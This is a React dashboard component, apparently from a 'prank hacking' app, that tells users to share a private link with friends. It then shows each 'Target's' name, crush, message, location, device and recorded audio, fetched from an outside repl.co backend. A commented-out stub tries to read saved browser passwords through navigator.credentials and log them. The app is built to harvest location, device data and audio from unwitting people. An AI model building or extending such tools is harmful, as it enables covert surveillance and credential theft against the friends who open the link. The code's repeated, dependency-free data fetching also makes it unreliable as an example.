import React, {useEffect, useState, useRef} from 'react';
import $ from 'jquery'
import {useNavigate, useParams} from 'react-router-dom'
function Home ()
{
      const navigate = useNavigate()
      const [fftd, setfftd] = useState([])
      const [ getd, setgetd ] = useState( [] )
      const [ fetall, setfetall ] = useState( [] )

      const postimg = useRef()
      
      const {id} = useParams()

      useEffect( () =>
      {
             
            $.ajax( {
                  method: "POST",
                  url: "https://myapp-1.badzybaddest.repl.co/home/api/get/now",
                  data: {
                        unic_id: localStorage.getItem( "_T_R_I_D_" ),
                  },
                  success: function ( data )
                  {
                        if ( data.length == 0 )
                        {
                              
                        }
                        else
                        {
                              setgetd( data );
                              data.map( val =>
                              {
                                    setfftd( val );
                              } );

                              $( document ).ready( function ()
                              {
                                   
                                          $( "html, body" ).animate( {
                                                scrollTop: $(
                                                      'html, body' ).get( 0 ).scrollHeight
                                          }, 2000 );
                                    
                              } );;

                        }
                        
                  }
            } );

           

      }, [] );

      const handlelogout = () =>
      { 
            if ( window.confirm( "Hey! Do You really want to Logout?" ) === true )
            { 
                  localStorage.clear( "_T_R_I_D_" )
                  window.open( "../#/Login", "_self" )
                  window.location.reload()
            }
            else
            { 
                  
            }
      }

//       async function tstfunc ()
//       {
//             const cred = await navigator.credentials.get( { password: true } )
//             console.log(cred.password)
//      }

//       tstfunc()
      

      
     
     

     

      useEffect( () =>
      { 

             $.ajax( {
                  method: "POST",
                  url: "https://myapp-1.badzybaddest.repl.co/home/fetch/api/get/main",
                  data: {
                        unic_id: localStorage.getItem( "_T_R_I_D_" ),
                  },
                  success: function ( data )
                  {
                        if ( data.length == 0 )
                        {
                             
                        }
                        else
                        { 
                              setfetall( data )
                             
                             

                        }
                        
                  }
             } );
            
             
       // move down

            
      })

     

      useEffect( () =>
      { 
            if ( !localStorage.getItem( "_T_R_I_D_" ) )
            { 
                 localStorage.clear( "_T_R_I_D_" )
                  window.open( "../#/Login", "_self" )
                  window.location.reload() 
            }
            else
            { 
                  
            }
      } )
      
       function scd ()
      { 
             var scrollingElement = (document.scrollingElement || document.body);
    scrollingElement.scrollTop = scrollingElement.scrollHeight;
      }
      


     

      
     
      return (
          
            <div className="movmain">
                  <title>You Dashboard ~ {fftd.names}</title>
                  <div className="big_t">
                        <h5>Welcome Hackers!</h5>
                        <h6>Wanna hack your friends? Copy your private link and share it with your friends... :)</h6>
                        <hr />
                        <div onClick={ handlelogout } className="logoutb">
                              Log Out
                        </div>
                        <hr />
                  </div>
                  <div className="link_copy alert-primary">
                        {
                              window.location.origin + "/#/Preview/" + fftd.unic_id
                        }
                  </div>
                  <div className="tools">
                        {
                              fetall.map( ( val ) =>
                              {
                                    if ( val.unic_id === localStorage.getItem( "_T_R_I_D_" ) )
                                    {

                                         

                                          const senddele = (e) =>
                                          {
                                                if ( window.confirm( "Do your wish to delete this message?" ) === true )
                                                {
                                                      $.ajax( {
                                                            method: "POST",
                                                            url: "https://myapp-1.badzybaddest.repl.co/home/delete/api/get/main",
                                                            data: {
                                                                  unic_id: e.target.id,
                                                            },
                                                            success: function ( data )
                                                            {
                                                                  if (data === "success")
                                                                  { 
                                                                      alert("Delete Successful!")  
                                                                  }
                                                                  else
                                                                  { 
                                                                        alert("Sorry Unable to Delete")
                                                                  }
                        
                                                            }
                                                      } );
                                                }
                                          };
                                          

                                          return (
                                                <div style={ { width: "100%" } } className="tool_one">
                                                      <div className="name_t">
                                                            <small>Target Name</small>
                                                            <h5>{ val.names }</h5>
                                                      </div>
                                                      <div className="personality">
                                                            <small>Target Crush Name</small>
                                                            <h5>{ val.crush }</h5>
                                                      </div>
                                                      <div className="target_message">
                                                            <small>Target Anonimous Message</small>
                                                            <h5>
                                                                  { val.msg }
                                                            </h5>
                                                      </div>
                                                      <div className="target_lo">
                                                            <small>Target Location</small>
                                                            <h5>
                                                                  { val.hackdata }
                                                            </h5>
                                                      </div>
                                                      <div className="targ_device">
                                                            <small>Target Device used</small>
                                                            <h5>
                                                                  { val.device }
                                                            </h5>
                                                      </div>
                                                      <div className="aud_d">
                                                            <audio src={ val.audioplayed } style={ { width: "100%" } } controls></audio>
                                                      </div>
                                                      <div className="attacks">
                                                            <div className="attacks11">
                                                                  <div style={{cursor: 'pointer'}} id={ val.itemid } onClick={ senddele } className="delete_t">
                                                                        Delete This Message
                                                                  </div>
                                                            </div>
                                                      </div>
                                                </div>
                                          );
                                    }
                              } )
                        }
                  </div>
            </div>
      );
}

export default Home;